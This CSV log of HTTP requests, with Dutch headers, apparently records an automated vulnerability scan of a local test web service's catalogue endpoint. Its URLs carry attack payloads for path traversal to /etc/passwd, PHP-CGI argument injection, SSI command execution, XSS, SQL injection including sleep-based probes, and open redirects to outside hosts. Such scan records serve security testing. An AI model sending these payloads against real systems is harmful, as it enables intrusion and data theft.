Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
108,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/5936370339625377393,200,OK,139,229,84
109,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2459530142778642452,200,OK,178,229,84
110,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/4373206281490707259,200,OK,252,229,84
111,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2398915529601214298,200,OK,236,229,84
113,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/5779367253433022715,200,OK,179,229,84
115,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/6723163933431835681,200,OK,140,229,84
117,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/2775890717038436285,200,OK,139,229,84
118,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7892023219996273184,200,OK,222,229,84
119,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/4546922721005427103,200,OK,184,229,84
120,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/4993383566453403725,200,OK,391,229,84
122,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/1080974020400958928,200,OK,400,229,84
123,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/3035635456430828111,200,OK,428,229,84
126,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,59,427,28
127,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,9,432,43
128,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,75,431,42
129,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,13,434,57
130,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7812564977248970611,200,OK,311,229,84
131,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,334,229,84
132,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,197,432,133
133,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/6000319331681190729,200,OK,233,229,84
135,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,30,431,133
136,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%2FWindows%2Fsystem.ini,200,OK,161,229,84
137,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/thishouldnotexistandhopefullyitwillnot/824827131916210840,200,OK,219,229,84
138,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,200,OK,214,229,84
139,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,160,229,84
140,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/thishouldnotexistandhopefullyitwillnot/1661000322633686555,200,OK,147,229,84
142,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%5CWindows%5Csystem.ini,200,OK,230,229,84
143,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/7525334857386474145,200,OK,101,228,84
144,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/5222774979041076559,200,OK,230,229,84
146,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,200,OK,241,229,84
147,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2Fetc%2Fpasswd,200,OK,179,229,84
148,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/param1/250246796574150624,200,OK,219,229,84
149,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,200,OK,229,229,84
150,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/param1/6910955290468182875,200,OK,285,229,84
152,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:08 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%2F,200,OK,1381,230,84
153,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:08 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,1268,229,84
154,Mon Mar 20 21:51:14 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,3895,214,145
155,Mon Mar 20 21:51:15 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,3415,214,145
156,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,503,Service Unavailable,33,214,145
157,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,28,214,145
158,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,503,Service Unavailable,39,214,145
159,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
160,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,34,214,145
161,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,46,214,145
162,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,20,214,145
163,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,349,214,145
164,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,52,214,145
165,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,19,214,145
166,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,53,214,145
167,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,17,214,145
168,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,22,214,145
169,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,22,214,145
170,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,23,214,145
171,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,20,214,145
172,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,65,214,145
173,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
174,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,32,214,145
175,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,27,214,145
176,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
177,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
178,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:20 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,1052,214,145
179,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,112,214,145
180,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,50,214,145
181,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,109,214,145
182,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/3494506092784170842.owasp.org,503,Service Unavailable,92,214,145
183,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/http%3A%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,34,214,145
184,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,13,214,145
185,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F3494506092784170842%252eowasp%252eorg,503,Service Unavailable,16,214,145
186,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/5%3BURL%3D%27https%3A%2F%2F3494506092784170842.owasp.org%27,503,Service Unavailable,56,214,145
187,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/URL%3D%27http%3A%2F%2F3494506092784170842.owasp.org%27,503,Service Unavailable,90,214,145
188,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/http%3A%2F%2F%5C3494506092784170842.owasp.org,503,Service Unavailable,19,214,145
189,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F%5C3494506092784170842.owasp.org,503,Service Unavailable,10,214,145
190,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,23,214,145
191,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,11,214,145
192,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,503,Service Unavailable,31,214,145
193,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,503,Service Unavailable,39,214,145
194,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,503,Service Unavailable,19,214,145
195,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,503,Service Unavailable,29,214,145
196,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,20,214,145
197,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/0W45pz4p,503,Service Unavailable,29,214,145
198,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers0W45pz4p,503,Service Unavailable,21,214,145
199,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,503,Service Unavailable,17,214,145
200,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,400,Bad Request,88,124,0
201,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E,503,Service Unavailable,21,214,145
202,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,11,214,145
203,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/zApPX0sS,503,Service Unavailable,29,214,145
204,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,90,214,145
205,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,41,214,145
206,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,29,214,145
207,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,15,214,145
208,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27,503,Service Unavailable,89,214,145
209,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27,503,Service Unavailable,116,214,145
210,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22,503,Service Unavailable,18,214,145
211,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22,503,Service Unavailable,73,214,145
212,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3B,503,Service Unavailable,17,214,145
213,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%3B,503,Service Unavailable,70,214,145
214,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%28,503,Service Unavailable,47,214,145
215,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27%28,503,Service Unavailable,29,214,145
216,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,36,214,145
217,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
218,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D1+--+,503,Service Unavailable,62,214,145
219,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D2+--+,503,Service Unavailable,20,214,145
220,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+OR+1%3D1+--+,503,Service Unavailable,23,214,145
221,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D2+--+,503,Service Unavailable,34,214,145
222,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+OR+1%3D1+--+,503,Service Unavailable,21,214,145
223,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%271%27+--+,503,Service Unavailable,35,214,145
224,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,41,214,145
225,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,26,214,145
226,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,27,214,145
227,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,10,214,145
228,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+UNION+ALL+select+NULL+--+,503,Service Unavailable,60,214,145
229,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
230,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
231,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
232,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
233,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,15,214,145
234,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
235,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,19,214,145
236,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+%2F+sleep%2815%29+,503,Service Unavailable,81,214,145
237,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+%2F+sleep%2815%29+%2F+%27,503,Service Unavailable,20,214,145
238,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+%2F+sleep%2815%29+%2F+%22,503,Service Unavailable,28,214,145
239,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,24,214,145
240,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,27,214,145
